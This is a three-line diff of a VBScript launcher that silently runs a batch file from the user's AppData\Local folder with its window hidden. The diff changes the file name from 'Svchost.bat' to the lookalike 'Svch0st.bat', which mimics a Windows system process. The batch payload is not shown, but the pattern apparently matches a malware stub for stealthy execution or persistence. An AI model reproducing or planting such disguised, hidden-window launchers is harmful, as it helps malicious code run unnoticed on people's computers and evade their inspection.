@@ -1,3 +1,3 @@
 Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run chr(34) & "%USERPROFILE%\AppData\Local\Svchost.bat" & Chr(34), 0
+WshShell.Run chr(34) & "%USERPROFILE%\AppData\Local\Svch0st.bat" & Chr(34), 0
 Set WshShell = Nothing
